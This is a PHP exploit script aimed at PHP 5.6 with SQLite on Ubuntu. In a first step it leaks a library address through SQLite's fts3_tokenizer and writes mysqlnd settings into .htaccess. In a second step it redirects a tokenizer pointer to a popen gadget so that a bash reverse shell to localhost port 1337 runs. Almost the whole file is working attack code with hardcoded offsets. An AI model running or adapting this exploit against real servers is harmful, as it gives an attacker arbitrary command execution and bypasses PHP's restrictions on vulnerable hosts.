<?php

/**
 * Test Environment: 
 * 
 * Linux ubuntu 3.19.0-44-generic #50-Ubuntu SMP Mon Jan 4 18:37:30 UTC 2016 x86_64
 * Apache/2.4.10 (Ubuntu) 
 * PHP Version 5.6.4-4ubuntu6.4
 *
 * apache_get_modules:
 * 
 * core, mod_so, mod_watchdog, http_core, mod_log_config, mod_logio, mod_version, 
 * mod_unixd, mod_access_compat, mod_alias, mod_auth_basic, mod_authn_core, mod_authn_file,
 * mod_authz_core, mod_authz_host, mod_authz_user, mod_autoindex, mod_deflate, mod_dir, 
 * mod_env, mod_filter, mod_jk, mod_mime, prefork, mod_negotiation, mod_php5, mod_proxy, 
 * mod_proxy_ajp, mod_proxy_http, mod_rewrite, mod_setenvif, mod_status
 * 
 * get_loaded_extensions:
 * 
 * Core, date, ereg, libxml, openssl, pcre, zlib, bcmath, bz2, calendar, ctype, dba, dom, 
 * hash, fileinfo, filter, ftp, gettext, SPL, iconv, mbstring, session, posix, Reflection, 
 * standard, shmop, SimpleXML, soap, sockets, Phar, exif, sysvmsg, sysvsem, sysvshm, tokenizer, 
 * wddx, xml, xmlreader, xmlwriter, zip, apache2handler, mysqlnd, PDO, json, mysql, mysqli, 
 * pdo_mysql, pdo_sqlite, readline, sqlite3, mhash, Zend OPcache
 * 
 */

function my_ini_set($values) {
  $file = '.htaccess';
  unlink($file);
  foreach ($values as $key => $val) {
    $content = "php_value $key $val" . PHP_EOL;
    file_put_contents($file, $content, FILE_APPEND);
  }
}

/** Note: 
 *   php5 does not support pack('Q'), so directly manipulate
 *   hex string to flip byte order
**/
function flip($val) {
  $len = strlen($val);
  $result = '';
  for ($i = $len; $i > 2; $i-=2) {
    $result .= substr($val, $i - 2, 2);
  }
  $result .= substr($val, 0, $i);
  $result .= str_repeat('0', 16 - $len);  
  return $result;
}

// gadgets 

// mysqlnd

$mysqlnd_net_cmd_buffer_size = 0x2434A8;
$mysqlnd_log_mask = $mysqlnd_net_cmd_buffer_size + 0x10;
$fake_module = $mysqlnd_net_cmd_buffer_size - 8;

// libphp

// .text:00000000002F137A   mov   rbx, rsi
// .text:00000000002F137D   lea   rsi, aRbLR+5    ; modes
// .text:00000000002F1384   sub   rsp, 58h
// .text:00000000002F1388   mov   [rsp+88h+var_74], edi
// .text:00000000002F138C   mov   rdi, rbx        ; command
// .text:00000000002F138F   mov   [rsp+88h+var_58], rdx
// .text:00000000002F1394   mov   rax, fs:28h
// .text:00000000002F139D   mov   [rsp+88h+var_40], rax
// .text:00000000002F13A2   xor   eax, eax
// .text:00000000002F13A4   mov   [rsp+88h+var_50], rcx
// .text:00000000002F13A9   mov   [rsp+88h+var_48], 0
// .text:00000000002F13B2   call  _popen

$system = 0x2F137A;

// libsqlite3

$simpleTokenizerModule = 0x2C1BE0;
$simpleCreate = 0x29400;

$db = new SQLite3(":memory:");
if (isset($_GET['base'])) {
  // step two
  
  $libmysqlnd_base = hexdec($_GET['base']);
  $stage = $libmysqlnd_base + $fake_module;
  $bomb = flip(dechex($stage));
  $db->exec("select fts3_tokenizer('simple', x'$bomb');
    create virtual table a using fts3;
    insert into a values('bash -c \"bash>/dev/tcp/127.1/1337 0<&1\"')");
  
} else {
  // step one
  
  $row = $db->query("select hex(fts3_tokenizer('simple')) addr;")->fetchArray();
  $leaked_addr = $row['addr'];
  
  $addr = hexdec(flip($leaked_addr));
  $libsqlite3_base = $addr - $simpleTokenizerModule;
  $libphp_base = $libsqlite3_base + 0x6234000;
  $libmysqlnd_base = $libsqlite3_base + 0x113a000;
  $simple_create = $libsqlite3_base + $simpleCreate;

  my_ini_set(array(
      'mysqlnd.net_cmd_buffer_size' => $simple_create,
      'mysqlnd.log_mask' => $libphp_base + $system));
  die(dechex($libmysqlnd_base));
}

$db->close();
